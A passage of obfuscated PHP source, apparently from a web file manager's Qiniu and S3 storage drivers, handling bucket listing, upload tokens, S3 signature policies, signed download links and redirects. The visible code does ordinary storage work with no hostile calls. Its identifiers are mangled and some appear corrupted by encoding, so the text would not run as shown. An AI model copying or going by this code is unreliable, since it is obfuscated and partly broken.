$C¨Ãšíáó += count($aÃŞ¥°áÖé[$dÆæõÚÀ„£[1281]]); } if ($eŸÎ»‘ÓÃÒ === $dÆæõÚÀ„£[33]) { break; } continue; } if ($DòéÇÂ¯ó¶) { if (!empty($aÃŞ¥°áÖé[$dÆæõÚÀ„£[1280]])) { return !0; } } else { if (!empty($aÃŞ¥°áÖé[$dÆæõÚÀ„£[1281]])) { return !0; } } if ($eŸÎ»‘ÓÃÒ === $dÆæõÚÀ„£[33]) { break; } } if ($Dù¯„Ï¹×õ) { return array($dÆæõÚÀ„£[201] => $A·›é¼›¾¬, $dÆæõÚÀ„£[202] => $C¨Ãšíáó); } goto AÀ²È¦‹ËÕ; e’Ş‡…„Ÿ: $eŸÎ»‘ÓÃÒ = $dÆæõÚÀ„£[33]; $BÍ›Àòñïƒ = 500; $Fùªê®”µâ = $dÆæõÚÀ„£[8]; goto D†²‘íÉ‘„; AÀ²È¦‹ËÕ: return !1; goto fŒ‹ìŸ‚Š; fŒ‹ìŸ‚Š: } public function listAll($EİøãõÕò) { $aÅ‘àˆˆ²É =& $_SERVER[Â€Á›¨õ]; $Fï¯Ä›Üƒ¯ = $this->fileList($EİøãõÕò, $aÅ‘àˆˆ²É[33], !0); $b´ƒÊ­÷Ó¡ = array(); foreach ($Fï¯Ä›Üƒ¯[$aÅ‘àˆˆ²É[73]] as $a‰Á¯§­«ğ) { $b´ƒÊ­÷Ó¡[$a‰Á¯§­«ğ[$aÅ‘àˆˆ²É[92]]] = $a‰Á¯§­«ğ[$aÅ‘àˆˆ²É[77]]; } foreach ($Fï¯Ä›Üƒ¯[$aÅ‘àˆˆ²É[74]] as $a‰Á¯§­«ğ) { if (is_string($a‰Á¯§­«ğ)) { $b´ƒÊ­÷Ó¡[$a‰Á¯§­«ğ] = 0; } } return $this->listAllFiles($EİøãõÕò, array_keys($b´ƒÊ­÷Ó¡), $b´ƒÊ­÷Ó¡); } private function fileList($EŒ¡·Î¨™, $B³¤†Ç˜ñ = '', $A¶ùÎîÅ¥ì = 0) { goto a“’Îà„Õ¿; DËŞÅĞÉ¿Š: $b·½Ø™¸Ÿ» = $c“Ûæ„ÊØÑ[33]; $c³›öĞçò— = 1000; $F»ï’Æ‡ÔÀ = $this->listItemCache === !1 ? !1 : !0; goto a ´¸Ìõ†Ù; a“’Îà„Õ¿: $c“Ûæ„ÊØÑ =& $_SERVER[Â€Á›¨õ]; $EŒ¡·Î¨™ = trim($EŒ¡·Î¨™, $c“Ûæ„ÊØÑ[8]); $d±¸„¬Ê » = empty($EŒ¡·Î¨™) ? $c“Ûæ„ÊØÑ[33] : $EŒ¡·Î¨™ . $c“Ûæ„ÊØÑ[8]; goto DËŞÅĞÉ¿Š; dÑ¼¸ÁŞØ: return array($c“Ûæ„ÊØÑ[74] => $fŒÎ¥åË¤, $c“Ûæ„ÊØÑ[73] => $DŠË„õ‡â); goto bè™Õâë½ù; a ´¸Ìõ†Ù: $fŒÎ¥åË¤ = $DŠË„õ‡â = array(); while (!0) { check_abort(); list($BéìÅé©½ä, $AÛÕ•Áåé) = $this->bucketManager->listFiles($this->bucket, $d±¸„¬Ê », $b·½Ø™¸Ÿ», $c³›öĞçò—, $B³¤†Ç˜ñ); if ($AÛÕ•Áåé) { break; } $b·½Ø™¸Ÿ» = array_key_exists($c“Ûæ„ÊØÑ[1247], $BéìÅé©½ä) ? $b·½Ø™¸Ÿ» = $BéìÅé©½ä[$c“Ûæ„ÊØÑ[1279]] : $c“Ûæ„ÊØÑ[33]; $FÌÕéŠ‰“ = isset($BéìÅé©½ä[$c“Ûæ„ÊØÑ[1280]]) ? $BéìÅé©½ä[$c“Ûæ„ÊØÑ[1280]] : array(); $AÒĞÔå†ÆÈ = isset($BéìÅé©½ä[$c“Ûæ„ÊØÑ[1281]]) ? $BéìÅé©½ä[$c“Ûæ„ÊØÑ[1281]] : array(); foreach ($FÌÕéŠ‰“ as $cöĞÚÈÃºÌ) { goto AåÕÜ÷Ÿ¬É; c»ŸŸ¥Ñ¥ƒ: if ($Fî­‹‹ù) { $fŒÎ¥åË¤[] = $e‹’Ø‘Î®£; continue; } $DŠË„õ‡â[] = $A¶ùÎîÅ¥ì ? $cöĞÚÈÃºÌ : $e‹’Ø‘Î®£; goto D”Ãòó‘—±; Dš¯À ³ª¤: $cöĞÚÈÃºÌ[$c“Ûæ„ÊØÑ[77]] = $f Œ¯‰·Š; $Fî­‹‹ù = $f Œ¯‰·Š == 0 && substr($e‹’Ø‘Î®£, strlen($e‹’Ø‘Î®£) - 1, 1) == $c“Ûæ„ÊØÑ[8] ? !0 : !1; if ($F»ï’Æ‡ÔÀ) { $this->cacheMethod($c“Ûæ„ÊØÑ[197], $e‹’Ø‘Î®£, $Fî­‹‹ù); $this->cacheMethod($c“Ûæ„ÊØÑ[198], $e‹’Ø‘Î®£, $cöĞÚÈÃºÌ); } goto c»ŸŸ¥Ñ¥ƒ; AåÕÜ÷Ÿ¬É: if ($cöĞÚÈÃºÌ[$c“Ûæ„ÊØÑ[92]] == $d±¸„¬Ê ») { continue; } $e‹’Ø‘Î®£ = $cöĞÚÈÃºÌ[$c“Ûæ„ÊØÑ[92]]; $f Œ¯‰·Š = $cöĞÚÈÃºÌ[$c“Ûæ„ÊØÑ[1277]]; goto Dš¯À ³ª¤; D”Ãòó‘—±: } foreach ($AÒĞÔå†ÆÈ as $e‹’Ø‘Î®£) { if ($e‹’Ø‘Î®£ == $d±¸„¬Ê ») { continue; } $fŒÎ¥åË¤[] = $e‹’Ø‘Î®£; if ($F»ï’Æ‡ÔÀ) { $this->cacheMethod($c“Ûæ„ÊØÑ[197], $e‹’Ø‘Î®£, !0); } } if ($b·½Ø™¸Ÿ» === $c“Ûæ„ÊØÑ[33]) { break; } } if ($F»ï’Æ‡ÔÀ) { $this->cacheMethod($c“Ûæ„ÊØÑ[197], $EŒ¡·Î¨™, !0); } goto dÑ¼¸ÁŞØ; bè™Õâë½ù: } public function canRead($Cá»é‚ïï¦) { return $this->exist($Cá»é‚ïï¦) ? !0 : !1; } public function canWrite($DÆÒ´ê¹) { return $this->exist($DÆÒ´ê¹) ? !0 : !1; } public function getContent($DÉÊì‘°Ü) { return $this->fileSubstr($DÉÊì‘°Ü, 0, -1); } public function setContent($dáÜ×Üª , $FÌ‹â‰ìË¢ = '') { $D°°Ü¬Ò©Ç = $this->tempFile($this->pathThis($dáÜ×Üª )); file_put_contents($D°°Ü¬Ò©Ç, $FÌ‹â‰ìË¢); if ($this->upload($dáÜ×Üª , $D°°Ü¬Ò©Ç)) { $this->tempFileRemve($D°°Ü¬Ò©Ç); return !0; } return !1; } public function refreshUrls($d¼Åáàôù×) { goto Fé—õ¦ïÑ·; Cé¶…À—Ä—: $aç¾™·ÀĞÑ = new Qiniu\Cdn\CdnManager($this->auth); list($aàÜà©Ò¤°, $B¦ÒÂáÙÍ×) = $aç¾™·ÀĞÑ->refreshUrls($fë¹ÆàÙ‘); if ($B¦ÒÂáÙÍ×) { return !1; } goto fÄåºÛÄ¥ë; fÄåºÛÄ¥ë: return $aàÜà©Ò¤°[$eí†­£†“‹[1052]] == $eí†­£†“‹[709] ? !0 : !1; goto EÄàñİ†; Fé—õ¦ïÑ·: $eí†­£†“‹ =& $_SERVER[Â€Á›¨õ]; $fë¹ÆàÙ‘ = array(); if (is_array($d¼Åáàôù×)) { foreach ($d¼Åáàôù× as $Eğ„˜×õ† ) { $fë¹ÆàÙ‘[] = $this->link($Eğ„˜×õ† ); } } else { $fë¹ÆàÙ‘[] = $this->link($d¼Åáàôù×); } goto Cé¶…À—Ä—; EÄàñİ†: } public function fileSubstr($Bøñ·Óáà¥, $A»Ò•àØ«ƒ, $CÑ¼”ğÛ†») { $CÂ‰¿†Ìã¼ =& $_SERVER[Â€Á›¨õ]; if (!($a´öï¥Ôä = $this->link($Bøñ·Óáà¥))) { return !1; } $AÍÒøöÙÈÌ = !1; if ($CÑ¼”ğÛ†» > 0) { $fÃô•ÃÊ½ó = $A»Ò•àØ«ƒ + $CÑ¼”ğÛ†» - 1; $AÍÒøöÙÈÌ = array($CÂ‰¿†Ìã¼[1282] . $A»Ò•àØ«ƒ . $CÂ‰¿†Ìã¼[434] . $fÃô•ÃÊ½ó); } $aè¿§İÉß = url_request($a´öï¥Ôä, $CÂ‰¿†Ìã¼[226], !1, $AÍÒøöÙÈÌ); return $aè¿§İÉß[$CÂ‰¿†Ìã¼[702]] ? $aè¿§İÉß[$CÂ‰¿†Ìã¼[1062]] : !1; } public function upload($CéÖ“¸Ö¨, $eÈÑ¥ à‡, $eœÑÚ¶–Ä = false, $b‘¥–’Ø’Ó = REPEAT_REPLACE) { $fàñÈßˆÓ = new Qiniu\Storage\UploadManager(); $eÙáÉ­¥Šç = $this->auth->uploadToken($this->bucket, $CéÖ“¸Ö¨); $DÊ‡‘‹ÖÀˆ = get_file_mime(get_path_ext($eÈÑ¥ à‡)); list($e”õõÓÙğ, $c‹ø‚ëÜ†) = $fàñÈßˆÓ->putFile($eÙáÉ­¥Šç, $CéÖ“¸Ö¨, $eÈÑ¥ à‡, null, $DÊ‡‘‹ÖÀˆ); return $c‹ø‚ëÜ† ? !1 : $this->getPathOuter($CéÖ“¸Ö¨); } public function uploadFormData($a›‹‡Í·çò, $FêÁô‘¾ = 3600) { return $this->uploadToken($a›‹‡Í·çò, $FêÁô‘¾); } public function multiUploadFormData($DšíÚíïœ, $cÊŸæïòè = 3600) { return $this->uploadToken($DšíÚíïœ, $cÊŸæïòè); } private function uploadToken($aÎµÄºòùÍ, $B‹‰½ßèù = 3600) { goto B·ø©õø­­; dŸ•¢”Õ¯°: $b…‰ËÎ”˜š = http_type() . "\x3a\x2f\x2f\x75\160\154\157\x61\x64{$C¤çèŞ¸ÒÆ}\x2e\161\151\x6e\x69\165\160\56\143\157\x6d\x2f"; return array($b™ƒ”´İ…[1286] => $c„ß¹®Öµ, $b™ƒ”´İ…[1287] => $b…‰ËÎ”˜š); goto cˆ«¡­ñğ; B·ø©õø­­: $b™ƒ”´İ… =& $_SERVER[Â€Á›¨õ]; $D¦¥÷ÕÓ¼ = $B‹‰½ßèù; $aµ¼§è¯¬ = array($b™ƒ”´İ…[1283] => $b™ƒ”´İ…[1284]); goto Cã„‚×ˆÌÑ; Cã„‚×ˆÌÑ: $EÅ¡Èƒïô = $aÎµÄºòùÍ; $c„ß¹®Öµ = $this->auth->uploadToken($this->bucket, $EÅ¡Èƒïô, $D¦¥÷ÕÓ¼, $aµ¼§è¯¬, !0); $C¤çèŞ¸ÒÆ = empty($this->region) || $this->region == $b™ƒ”´İ…[1285] ? $b™ƒ”´İ…[33] : $b™ƒ”´İ…[434] . $this->region; goto dŸ•¢”Õ¯°; cˆ«¡­ñğ: } public function download($C‹Œ¹òÕÔ¼, $d…‰Ç„Í‰ß) { goto E­”èÅØä; C®ë¹îáœ: $a‰®ÏÊÕê = 1024 * 200; $A¸âÎ²§Âİ = fopen($FñÂí¨ïß, $_SERVER[Â€Á›¨õ][1288]); while (!0) { $eé˜ÜÍŒÔ = $this->fileSubstr($C‹Œ¹òÕÔ¼, $b†ºö¬Ğà´, $a‰®ÏÊÕê); if ($eé˜ÜÍŒÔ === !1) { return !1; } fwrite($A¸âÎ²§Âİ, $eé˜ÜÍŒÔ); $b†ºö¬Ğà´ += $a‰®ÏÊÕê; if (strlen($eé˜ÜÍŒÔ) < $a‰®ÏÊÕê) { break; } } goto cÇàõÊ±ëè; cÇàõÊ±ëè: fclose($A¸âÎ²§Âİ); return $d…‰Ç„Í‰ß; goto DÔ•ºå¢•; E­”èÅØä: $FñÂí¨ïß = IO::getPathInner(IO::mkfile($d…‰Ç„Í‰ß)); if (!($b¹—ïËˆ¹ = $this->link($C‹Œ¹òÕÔ¼))) { return !1; } $b†ºö¬Ğà´ = 0; goto C®ë¹îáœ; DÔ•ºå¢•: } public function link($FÃ·‡èŠëã, $båÔ‹Àµå– = '') { if (!$this->isFile($FÃ·‡èŠëã)) { return !1; } $D’¤Å¿Ğñ = $this->getHost() . $_SERVER[Â€Á›¨õ][8] . $this->pathEncode($FÃ·‡èŠëã) . $båÔ‹Àµå–; return $this->auth->privateDownloadUrl($D’¤Å¿Ğñ, 3600 * 12); } public function fileOut($b„¾¹ù‘óÕ, $fò¿Ïæ§¦” = false, $c¾ø‚‰Ğ¹ = false, $C‘ÃƒíäÚ = '') { $c‚ìğÓíáÃ =& $_SERVER[Â€Á›¨õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($b„¾¹ù‘óÕ, $fò¿Ïæ§¦”, $c¾ø‚‰Ğ¹, $C‘ÃƒíäÚ); } if (!$c¾ø‚‰Ğ¹) { $c¾ø‚‰Ğ¹ = $this->pathThis($b„¾¹ù‘óÕ); } $E¼õİÆ÷ä = $fò¿Ïæ§¦” ? $c‚ìğÓíáÃ[1289] . rawurlencode($c¾ø‚‰Ğ¹) : $c‚ìğÓíáÃ[33]; $fƒ±ô„Â‹ = $this->link($b„¾¹ù‘óÕ, $E¼õİÆ÷ä); $this->fileOutLink($fƒ±ô„Â‹); } public function fileOutServer($Eàí¾Ô©Ë³, $Fë¿æ›ÌÜ = false, $e«˜¦»Ä´ = false, $FôìÜµ„‰¨ = '') { parent::fileOut($Eàí¾Ô©Ë³, $Fë¿æ›ÌÜ, $e«˜¦»Ä´, $FôìÜµ„‰¨); } public function fileOutImage($EÖ‘ÒÍó, $e‰Ó»ƒœƒõ = 250) { $FóƒªçÆ = $this->link($EÖ‘ÒÍó, $_SERVER[Â€Á›¨õ][1290] . $e‰Ó»ƒœƒõ); $this->fileOutLink($FóƒªçÆ); } public function fileOutImageServer($CÄ¼‘‹¸¨™, $Aëô˜¿ÄŞã = 250) { parent::fileOutImage($CÄ¼‘‹¸¨™, $Aëô˜¿ÄŞã); } public function hashMd5($b‰¡Åä«œ‰) { $d’Ö«åÀÂ¶ =& $_SERVER[Â€Á›¨õ]; $e²ö¸ÖÎ¬ = $this->objectMeta($b‰¡Åä«œ‰); return isset($e²ö¸ÖÎ¬[$d’Ö«åÀÂ¶[206]]) ? $e²ö¸ÖÎ¬[$d’Ö«åÀÂ¶[206]] : !1; $d …ÃÃ‰´› = $this->link($b‰¡Åä«œ‰, $d’Ö«åÀÂ¶[1291]); } public function size($c…ƒò†êÒ) { $fªª°ÃÓ®§ = $this->objectMeta($c…ƒò†êÒ); return $fªª°ÃÓ®§ ? $fªª°ÃÓ®§[$_SERVER[Â€Á›¨õ][77]] : 0; } public function info($bÉÕ“£Ù¤ë) { if ($this->isFolder($bÉÕ“£Ù¤ë)) { return $this->folderInfo($bÉÕ“£Ù¤ë); } else { if ($this->isFile($bÉÕ“£Ù¤ë)) { return $this->fileInfo($bÉÕ“£Ù¤ë); } } return !1; } public function exist($A¸öë„½‚¾) { return $this->isFile($A¸öë„½‚¾) || $this->isFolder($A¸öë„½‚¾); } public function isFile($d«áøÛìòÉ) { return !$this->isFolder($d«áøÛìòÉ) && $this->objectMeta($d«áøÛìòÉ); } public function isFolder($Dñ…¦¢Ûê) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][197], $Dñ…¦¢Ûê); } protected function objectMeta($dÃ¨ÂÀÕÅŠ) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][198], $dÃ¨ÂÀÕÅŠ); } protected function _objectMeta($aÇ’Œ¶ùçÎ) { $fùñ˜ÇÖ¨½ =& $_SERVER[Â€Á›¨õ]; list($fò–¢å…Ç, $aºŠÉáÜ¥Œ) = $this->bucketManager->stat($this->bucket, $aÇ’Œ¶ùçÎ); if ($fò–¢å…Ç) { $fò–¢å…Ç[$fùñ˜ÇÖ¨½[77]] = intval($fò–¢å…Ç[$fùñ˜ÇÖ¨½[1277]]); } return $fò–¢å…Ç; } protected function _isFolder($dÜ×£– Ğù) { $cË§ó«¼µ =& $_SERVER[Â€Á›¨õ]; if ($dÜ×£– Ğù == $cË§ó«¼µ[33] || $dÜ×£– Ğù == $cË§ó«¼µ[8]) { return !0; } list($bãĞè´Ê†Â, $dĞÚ‘¡×) = $this->bucketManager->listFiles($this->bucket, trim($dÜ×£– Ğù, $cË§ó«¼µ[8]) . $cË§ó«¼µ[8], $cË§ó«¼µ[33], 1, $cË§ó«¼µ[8]); return !empty($bãĞè´Ê†Â[$cË§ó«¼µ[1280]]) || !empty($bãĞè´Ê†Â[$cË§ó«¼µ[1281]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Aæñ­ãß‘) { parent::__construct($Aæñ­ãß‘); } public function uploadFormData($d¬¤ôÜ·¨, $c½Ş½‰Ú¡Ê = 3600) { goto Cºˆ­İ†“ê; Cºˆ­İ†“ê: $cœÏ·¨¤‚æ =& $_SERVER[Â€Á›¨õ]; $f¼îÕÊò‚» = $cœÏ·¨¤‚æ[191]; $AåÑÀ–ã° = $cœÏ·¨¤‚æ[1195]; goto EìĞŞÅñàù; A¾¡¸†â‚±: $D¡´Æ‰³ˆ£ = $cœÏ·¨¤‚æ[1197]; $a„¬“Ù¡†ï = $c½Ş½‰Ú¡Ê . $cœÏ·¨¤‚æ[33]; $b©·‹Ôß‰‘ = $cœÏ·¨¤‚æ[1161]; goto d‘ø¢Îì‰; EŒâÛƒ¢À: $d›¤á¥ÔÓ = hash_hmac($cœÏ·¨¤‚æ[1205], $AÃ‡¾£…ò¬, $B¶çÈ‡Šã, !0); $EôÅ°î—‹³ = hash_hmac($cœÏ·¨¤‚æ[1205], $D¡´Æ‰³ˆ£, $d›¤á¥ÔÓ, !0); $aŸï¯®­Ü’ = hash_hmac($cœÏ·¨¤‚æ[1205], $B¡£ì…·¾, $EôÅ°î—‹³); goto a¢„Ø¬š·; d‘ø¢Îì‰: $cï“—‚°›Á = array($this->accessKey, $C­¾¿ô©Ğ›, $this->region, $AÃ‡¾£…ò¬, $D¡´Æ‰³ˆ£); $cÁÊš³ôÄé = implode($cœÏ·¨¤‚æ[8], $cï“—‚°›Á); $dØê÷¾ÄÒë = array($cœÏ·¨¤‚æ[1163] => gmdate($cœÏ·¨¤‚æ[1162], strtotime($cœÏ·¨¤‚æ[1198])), $cœÏ·¨¤‚æ[1164] => array(array($cœÏ·¨¤‚æ[1166] => $this->bucket), array($cœÏ·¨¤‚æ[1165] => $f¼îÕÊò‚»), array($cœÏ·¨¤‚æ[1167], $cœÏ·¨¤‚æ[1168], $cœÏ·¨¤‚æ[33]), array($cœÏ·¨¤‚æ[1167], $cœÏ·¨¤‚æ[1199], $cœÏ·¨¤‚æ[33]), array($cœÏ·¨¤‚æ[1167], $cœÏ·¨¤‚æ[1200], $cœÏ·¨¤‚æ[33]), array($cœÏ·¨¤‚æ[1169] => $b©·‹Ôß‰‘), array($cœÏ·¨¤‚æ[1201] => $cÁÊš³ôÄé), array($cœÏ·¨¤‚æ[1202] => $AåÑÀ–ã°), array($cœÏ·¨¤‚æ[1203] => $f±ğ‘ÔÃØ), array($cœÏ·¨¤‚æ[1204] => $a„¬“Ù¡†ï))); goto AĞ‚ññÆ³Ä; AĞ‚ññÆ³Ä: $B¡£ì…·¾ = base64_encode(json_encode($dØê÷¾ÄÒë)); $CÀÍ½Åˆ‘– = hash_hmac($cœÏ·¨¤‚æ[1205], $C­¾¿ô©Ğ›, $cœÏ·¨¤‚æ[1206] . $this->secret, !0); $B¶çÈ‡Šã = hash_hmac($cœÏ·¨¤‚æ[1205], $this->region, $CÀÍ½Åˆ‘–, !0); goto EŒâÛƒ¢À; a¢„Ø¬š·: $f‡¦•­Ìº = array($cœÏ·¨¤‚æ[209] => $cœÏ·¨¤‚æ[33], $cœÏ·¨¤‚æ[1207] => $cœÏ·¨¤‚æ[33], $cœÏ·¨¤‚æ[1165] => $f¼îÕÊò‚», $cœÏ·¨¤‚æ[1169] => $b©·‹Ôß‰‘, $cœÏ·¨¤‚æ[1173] => $B¡£ì…·¾, $cœÏ·¨¤‚æ[1208] => $cÁÊš³ôÄé, $cœÏ·¨¤‚æ[1209] => $AåÑÀ–ã°, $cœÏ·¨¤‚æ[1210] => $f±ğ‘ÔÃØ, $cœÏ·¨¤‚æ[1211] => $a„¬“Ù¡†ï, $cœÏ·¨¤‚æ[1212] => $aŸï¯®­Ü’, $cœÏ·¨¤‚æ[175] => $this->getHost()); return $f‡¦•­Ìº; goto cßÀ¸¨„ĞŒ; EìĞŞÅñàù: $AÃ‡¾£…ò¬ = $cœÏ·¨¤‚æ[59]; $f±ğ‘ÔÃØ = gmdate($cœÏ·¨¤‚æ[1196]); $C­¾¿ô©Ğ› = gmdate($cœÏ·¨¤‚æ[703]); goto A¾¡¸†â‚±; cßÀ¸¨„ĞŒ: } public function multiUploadFormData($d·¥Ÿì·ˆ, $cºóØîš® = 3600) { $F¹¸¢Ü“½· =& $_SERVER[Â€Á›¨õ]; $DùĞË½ÛõÆ = gmdate($F¹¸¢Ü“½·[1292]); $CæîÄ¦ä = array(); $AùÄã°×† = $this->client->getUploadId($this->bucket, $d·¥Ÿì·ˆ, $CæîÄ¦ä); if (!$AùÄã°×†) { return !1; } return array($F¹¸¢Ü“½·[219] => $AùÄã°×†, $F¹¸¢Ü“½·[175] => $this->getHost() . $F¹¸¢Ü“½·[8] . $this->pathEncode($d·¥Ÿì·ˆ), $F¹¸¢Ü“½·[220] => $DùĞË½ÛõÆ, $F¹¸¢Ü“½·[92] => $d·¥Ÿì·ˆ); } public function multiUploadAuthData($E¸ßÍß¶Ñ, $AŸ—£Æ¨Úµ = array()) { goto CªÓ‘ó™¶; CªÓ‘ó™¶: $eÂªÀ÷ÎÜ =& $_SERVER[Â€Á›¨õ]; $c°ˆÅªÂ‹ë = isset($AŸ—£Æ¨Úµ[$eÂªÀ÷ÎÜ[167]]) ? $AŸ—£Æ¨Úµ[$eÂªÀ÷ÎÜ[167]] : $eÂªÀ÷ÎÜ[33]; $d²ä˜ˆ´¨Í = $AŸ—£Æ¨Úµ[$eÂªÀ÷ÎÜ[92]]; goto F½ëï†¨±µ; cÉ¬—‹ˆÈ: if (isset($AŸ—£Æ¨Úµ[$eÂªÀ÷ÎÜ[1293]])) { $CêÀ‰õèñ·[$eÂªÀ÷ÎÜ[1294]] = $AŸ—£Æ¨Úµ[$eÂªÀ÷ÎÜ[1293]]; } $c³õˆ®ÙŠŠ = explode($eÂªÀ÷ÎÜ[177], $this->getHost()); $A÷‘˜ƒéçÌ = array($eÂªÀ÷ÎÜ[1295] => $c³õˆ®ÙŠŠ[1], $eÂªÀ÷ÎÜ[1296] => $eÂªÀ÷ÎÜ[33], $eÂªÀ÷ÎÜ[209] => $eÂªÀ÷ÎÜ[118], $eÂªÀ÷ÎÜ[1207] => $AŸ—£Æ¨Úµ[$eÂªÀ÷ÎÜ[77]]); goto dö¥¦µÎ¶; dö¥¦µÎ¶: $Aß‚í™İ¯İ = $eÂªÀ÷ÎÜ[224]; $D³ÒÀÚß­¯ = $eÂªÀ÷ÎÜ[8] . $this->pathEncode($d²ä˜ˆ´¨Í) . $c°ˆÅªÂ‹ë; $bÀÛ’ôóµ¦ = $this->client->__getSignatureV4($CêÀ‰õèñ·, $A÷‘˜ƒéçÌ, $Aß‚í™İ¯İ, $D³ÒÀÚß­¯); goto dÌ¤‚Ç÷àç; dÌ¤‚Ç÷àç: if (strpos($c°ˆÅªÂ‹ë, $eÂªÀ÷ÎÜ[223]) === 0) { if (isset($CêÀ‰õèñ·[$eÂªÀ÷ÎÜ[1294]])) { $DÃÏ‰‚÷Ô‰ = $CêÀ‰õèñ·[$eÂªÀ÷ÎÜ[1294]]; } else { if (isset($bÀÛ’ôóµ¦[$eÂªÀ÷ÎÜ[1294]])) { $DÃÏ‰‚÷Ô‰ = $bÀÛ’ôóµ¦[$eÂªÀ÷ÎÜ[1294]]; } else { $DÃÏ‰‚÷Ô‰ = hash($eÂªÀ÷ÎÜ[1205], $eÂªÀ÷ÎÜ[33]); } } return array($eÂªÀ÷ÎÜ[230] => $bÀÛ’ôóµ¦[$eÂªÀ÷ÎÜ[230]], $eÂªÀ÷ÎÜ[1294] => $DÃÏ‰‚÷Ô‰, $eÂªÀ÷ÎÜ[220] => $bÀÛ’ôóµ¦[$eÂªÀ÷ÎÜ[1297]]); } return $bÀÛ’ôóµ¦[$eÂªÀ÷ÎÜ[230]]; goto DôµÏïôŞŞ; F½ëï†¨±µ: unset($AŸ—£Æ¨Úµ[$eÂªÀ÷ÎÜ[92]]); if (isset($AŸ—£Æ¨Úµ[$eÂªÀ÷ÎÜ[221]])) { return $this->listUploadParts($d²ä˜ˆ´¨Í, $AŸ—£Æ¨Úµ); } $CêÀ‰õèñ· = array(); goto cÉ¬—‹ˆÈ; DôµÏïôŞŞ: } public function listUploadParts($c¾’ÆŞŒ®Ê, $cÊ¯¬àÃæ„ = array()) { goto e›õ¸ïŠÖ‹; c¥Æ ù±ˆÓ: $Cñ†â®×¦“ = array($b¼íÅ‘Œ»Ø[1295] => $A¸İÒ‹ã¦³[1], $b¼íÅ‘Œ»Ø[209] => $b¼íÅ‘Œ»Ø[118], $b¼íÅ‘Œ»Ø[1207] => strlen($aè´òÊÖ)); $eòºÕÔ±Ã´ = $b¼íÅ‘Œ»Ø[222]; $AÄÖÏ‡Ô = $b¼íÅ‘Œ»Ø[8] . $this->pathEncode($c¾’ÆŞŒ®Ê) . $cÊ¯¬àÃæ„[$b¼íÅ‘Œ»Ø[167]]; goto Eç˜× ¨©Ó; e›õ¸ïŠÖ‹: $b¼íÅ‘Œ»Ø =& $_SERVER[Â€Á›¨õ]; $D¦Ÿ×§†éô = str_replace($b¼íÅ‘Œ»Ø[231], $b¼íÅ‘Œ»Ø[33], $cÊ¯¬àÃæ„[$b¼íÅ‘Œ»Ø[167]]); $fá‚ë±†Æ® = $this->client->listParts($this->bucket, $c¾’ÆŞŒ®Ê, $D¦Ÿ×§†éô); goto Aƒ‹¸åæ‡º; AÔËÜŠì£‘: $aè´òÊÖ .= $b¼íÅ‘Œ»Ø[1301]; $d«Â¬ÀÄ¿¬ = array(); $A¸İÒ‹ã¦³ = explode($b¼íÅ‘Œ»Ø[177], $this->getHost()); goto c¥Æ ù±ˆÓ; Aƒ‹¸åæ‡º: if (!$fá‚ë±†Æ®) { return !1; } $aè´òÊÖ = $b¼íÅ‘Œ»Ø[1298]; foreach ($fá‚ë±†Æ® as $f¿¥‚†‡‘Æ) { $aè´òÊÖ .= $b¼íÅ‘Œ»Ø[1299] . "\x3c\120\141\x72\164\x4e\x75\155\x62\x65\x72\x3e{$f¿¥‚†‡‘Æ[$b¼íÅ‘Œ»Ø[1254]]}\74\x2f\x50\x61\x72\x74\116\x75\x6d\142\145\x72\76\12" . "\x3c\105\x54\141\x67\76{$f¿¥‚†‡‘Æ[$b¼íÅ‘Œ»Ø[1255]]}\x3c\57\105\124\x61\147\x3e\xa" . $b¼íÅ‘Œ»Ø[1300]; } goto AÔËÜŠì£‘; Eç˜× ¨©Ó: $E¾Çê«‹ = $this->client->__getSignatureV4($d«Â¬ÀÄ¿¬, $Cñ†â®×¦“, $eòºÕÔ±Ã´, $AÄÖÏ‡Ô, $aè´òÊÖ); return array($b¼íÅ‘Œ»Ø[230] => $E¾Çê«‹[$b¼íÅ‘Œ»Ø[230]], $b¼íÅ‘Œ»Ø[220] => $E¾Çê«‹[$b¼íÅ‘Œ»Ø[1297]], $b¼íÅ‘Œ»Ø[232] => $fá‚ë±†Æ®, $b¼íÅ‘Œ»Ø[1294] => $E¾Çê«‹[$b¼íÅ‘Œ»Ø[1294]]); goto d›ÒÖ’Î„; d›ÒÖ’Î„: } public function link($c“·è Ûğ, $fŠ¿‘ã¿ƒ = array()) { return parent::link($c“·è Ûğ, $fŠ¿‘ã¿ƒ); } public function fileOut($a²¯¨ß×ìæ, $A˜š±å‡Õó = false, $f¼‚Ğğçõ° = false, $a±‰ô”ì–‘ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Â€Á›¨õ][1302])) { return parent::fileOutServer($a²¯¨ß×ìæ, $A˜š±å‡Õó, $f¼‚Ğğçõ°, $a±‰ô”ì–‘); } parent::fileOut($a²¯¨ß×ìæ, $A˜š±å‡Õó, $f¼‚Ğğçõ°, $a±‰ô”ì–‘); } public function fileOutImage($DÌ–ŠåáÔ­, $B¸šöçšñç = 250) { if (strstr($this->endpoint, $_SERVER[Â€Á›¨õ][1302])) { return parent::fileOutImageServer($DÌ–ŠåáÔ­, $B¸šöçšñç); } parent::fileOutImage($DÌ–ŠåáÔ­, $B¸šöçšñç); } public function fileOutLink($bÀ×ñåƒè) { $fÌÊÎä…˜ =& $_SERVER[Â€Á›¨õ]; if (substr($bÀ×ñåƒè, 0, 7) == $fÌÊÎä…˜[1176]) { $bÀ×ñåƒè = $fÌÊÎä…˜[1177] . substr($bÀ×ñåƒè, 7); } header($fÌÊÎä…˜[158] . $bÀ×ñåƒè); die; } public function getHost() { $a¬›Œ¥èº =& $_SERVER[Â€Á›¨õ]; $AÊµÊ±‹¿ù = str_rtrim(parent::getHost(), $a¬›Œ¥èº[8] . $this->bucket); $AÊµÊ±‹¿ù = explode($a¬›Œ¥èº[177], $AÊµÊ±‹¿ù); return $AÊµÊ±‹¿ù[0] . $a¬›Œ¥èº[177] . $this->bucket . $a¬›Œ¥èº[94] . $AÊµÊ±‹¿ù[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($FÛ­·ğ¬Çİ, $a‰¿™èÏ— = 0) { parent::__construct(); $this->source = $FÛ­·ğ¬Çİ; $this->sourceSize = $a‰¿™èÏ—; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($D³‰‰ê‚´Ì = false) { return 